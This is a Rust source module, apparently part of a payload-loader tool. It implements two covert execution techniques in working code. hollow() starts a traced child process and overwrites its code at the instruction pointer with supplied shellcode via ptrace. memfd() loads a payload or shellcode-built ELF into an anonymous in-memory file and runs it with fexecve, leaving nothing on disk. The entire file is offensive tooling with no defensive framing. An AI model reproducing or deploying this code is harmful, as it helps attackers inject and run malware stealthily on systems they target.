use std::ffi::{c_void, CString};
use std::os::fd::AsRawFd;

use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::{self, execve, fexecve, fork, ForkResult};

use crate::elf::create_elf;
use crate::error::{Error, Result};
use crate::utils::{get_env, str_to_vec_c_string};
use crate::{Payload, PayloadType};

pub fn hollow(payload: Payload) -> Result<()> {
    match unsafe { fork() } {
        Ok(ForkResult::Parent { child, .. }) => {
            waitpid(child, None)?;

            match payload.payload_type {
                PayloadType::Executable => {
                    return Err(Error::NotImplemented(
                        "hollow can not take executables".to_string(),
                    ));
                }
                PayloadType::Shellcode => {
                    let regs = ptrace::getregs(child)?;

                    let mut addr = regs.rip;

                    for byte in &payload.bytes {
                        ptrace::write(child, addr as *mut c_void, *byte as i64)?;
                        addr += 1;
                    }

                    ptrace::detach(child, None)?;
                }
            }
        }

        Ok(ForkResult::Child) => {
            ptrace::traceme()?;

            let target_c_string = CString::new(payload.target).unwrap();

            let target_args = str_to_vec_c_string(&payload.target_args);
            let target_args_slice = target_args.as_slice();

            let env = get_env();
            let env_slice = env.as_slice();

            execve(&target_c_string, target_args_slice, env_slice)?;
        }

        Err(error) => return Err(Error::LinuxError(error)),
    }

    Ok(())
}

pub fn memfd(payload: Payload) -> Result<()> {
    let anon_file_name = CString::new("").unwrap();
    let p_file_name = anon_file_name.as_c_str();

    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;

    let bytes = match payload.payload_type {
        PayloadType::Executable => payload.bytes,
        PayloadType::Shellcode => create_elf(&payload.bytes),
    };

    unistd::write(&fd, &bytes)?;

    let args = str_to_vec_c_string(&payload.args);
    let args_slice = args.as_slice();

    let env = get_env();
    let env_slice = env.as_slice();

    fexecve(fd.as_raw_fd(), args_slice, env_slice)?;

    Ok(())
}
